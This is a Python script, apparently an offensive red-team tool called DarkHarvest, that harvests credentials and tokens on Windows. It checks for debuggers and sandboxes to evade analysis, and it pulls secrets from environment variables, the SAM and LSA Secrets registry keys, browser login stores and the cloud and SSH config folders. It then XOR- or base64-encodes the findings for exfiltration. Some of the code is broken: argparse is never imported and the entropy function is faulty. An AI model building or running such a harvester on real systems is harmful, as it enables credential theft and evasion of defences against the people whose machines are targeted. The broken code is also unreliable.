#!/usr/bin/env python3
# DarkHarvest.py - Advanced Credential & Token Phantom Harvester (2026 Red Team Elite)
# EPO - Lab / Explicit Permission ONLY! 💀

import sys
import os
import time
import base64
import datetime
import random
import subprocess
import platform
import re
import winreg as reg
import getpass
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path
import hashlib

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

# ================= CONFIG =================
XOR_KEY = 0xB7E4A9F2
DEFAULT_OUTPUT = "darkharvest.b64"
ENTROPY_THRESHOLD = 3.8

SECRET_PATTERNS = [
    r'(?i)(password|pass|pwd)\s*=\s*["\']?([^"\']+)["\']?',
    r'(?i)(api|secret|token|bearer|auth|jwt)\s*[_-]?key\s*=\s*["\']?([^"\']+)["\']?',
    r'(?i)(aws_access_key_id|aws_secret_access_key|azure_client_secret|google_application_credentials)\s*=\s*["\']?([^"\']+)["\']?',
    r'-----BEGIN\s+(RSA|OPENSSH|ENCRYPTED)\s+PRIVATE\s+KEY-----',
    r'(?i)BEGIN\s+CERTIFICATE',
]

# ================= EVASION HELPERS =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

def is_sandbox():
    checks = [
        is_debugged(),
        len(os.listdir("C:\\")) < 6,
        "sandbox" in getpass.getuser().lower(),
        os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys")
    ]
    return any(checks)

def fake_delay(min_sec=2, max_sec=10):
    time.sleep(random.uniform(min_sec, max_sec))

def xor_obfuscate(data: str) -> str:
    bytes_data = data.encode()
    xored = bytes(b ^ (XOR_KEY & 0xFF) for b in bytes_data)
    return base64.b64encode(xored).decode()

# ================= HARVEST FUNCTIONS =================
def harvest_env_vars():
    result = []
    for k, v in os.environ.items():
        if any(p in k.lower() for p in ['pass', 'key', 'token', 'secret', 'cred', 'aws', 'azure', 'gcp']):
            result.append(f"ENV: {k} = {v[:20]}... (truncated)")
    return result

def harvest_registry_secrets():
    if not is_admin():
        return ["REGISTRY: Admin required"]
    result = []
    keys = [
        (reg.HKEY_LOCAL_MACHINE, r"SECURITY\Policy\Secrets"),
        (reg.HKEY_LOCAL_MACHINE, r"SAM\SAM\Domains\Account\Users"),
    ]
    for hive, path in keys:
        try:
            with reg.OpenKey(hive, path) as key:
                result.append(f"REG: Opened {path}")
        except Exception as e:
            result.append(f"REG: {path} - Access denied / {e}")
    return result

def harvest_browser_paths():
    user = getpass.getuser()
    paths = [
        f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
    ]
    result = []
    for p in paths:
        if os.path.exists(p):
            result.append(f"BROWSER: Credential store found at {p}")
    return result

def search_secret_patterns():
    result = []
    search_roots = [
        Path.home() / ".aws",
        Path.home() / ".azure",
        Path.home() / ".config" / "gcloud",
        Path.home() / ".ssh",
        Path("C:\\ProgramData"),
    ]
    for root in search_roots:
        if not root.exists():
            continue
        for path in root.rglob("*"):
            if path.is_file() and path.stat().st_size < 1024*1024:
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(16384)
                        for pat in SECRET_PATTERNS:
                            matches = re.findall(pat, content)
                            if matches:
                                result.append(f"SECRET: {path} → {matches[:3]}")
                except:
                    pass
    return result

def compute_entropy(data: str) -> float:
    if not data:
        return 0.0
    entropy = 0
    for x in set(data):
        p_x = data.count(x) / len(data)
        entropy += - p_x * (p_x.log2() if p_x > 0 else 0)
    return entropy

def main():
    parser = argparse.ArgumentParser(description="DarkHarvest - Elite Cred/Token Phantom")
    parser.add_argument("--full", action="store_true", help="All harvest methods")
    parser.add_argument("--env", action="store_true")
    parser.add_argument("--registry", action="store_true")
    parser.add_argument("--browsers", action="store_true")
    parser.add_argument("--files", action="store_true")
    parser.add_argument("--exfil-base64", action="store_true")
    parser.add_argument("--exfil-xor", action="store_true")
    parser.add_argument("--output", type=str, default=DEFAULT_OUTPUT)
    parser.add_argument("--verbose", "-v", action="store_true")

    args = parser.parse_args()

    print(f"[{timestamp()}] DarkHarvest starting - evasion status:")
    print(f"  Admin: {is_admin()}")
    print(f"  Debugger: {is_debugged()}")
    print(f"  Sandbox/VM: {is_sandbox()}")

    fake_delay()

    findings = []

    if args.full or args.env:
        findings.extend(harvest_env_vars())
        if args.verbose:
            print(f"[{timestamp()}] Env harvest done")

    if args.full or args.registry:
        findings.extend(harvest_registry_secrets())
        if args.verbose:
            print(f"[{timestamp()}] Registry harvest done")

    if args.full or args.browsers:
        findings.extend(harvest_browser_paths())
        if args.verbose:
            print(f"[{timestamp()}] Browser harvest done")

    if args.full or args.files:
        findings.extend(search_secret_patterns())
        if args.verbose:
            print(f"[{timestamp()}] File pattern search done")

    if not findings:
        print(f"[{timestamp()}] Nothing harvested")
        return

    output = "\n".join(findings)
    print(output)

    if args.exfil_base64 or args.exfil_xor:
        obfuscated = xor_obfuscate(output) if args.exfil_xor else base64.b64encode(output.encode()).decode()
        print(f"\n[{timestamp()}] Exfil-ready:\n{obfuscated}")

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[{timestamp()}] Written to {args.output}")
        except Exception as e:
            print(f"[{timestamp()}] Write failed: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[{timestamp()}] Interrupted")
    except Exception as e:
        print(f"[{timestamp()}] Fatal: {e}")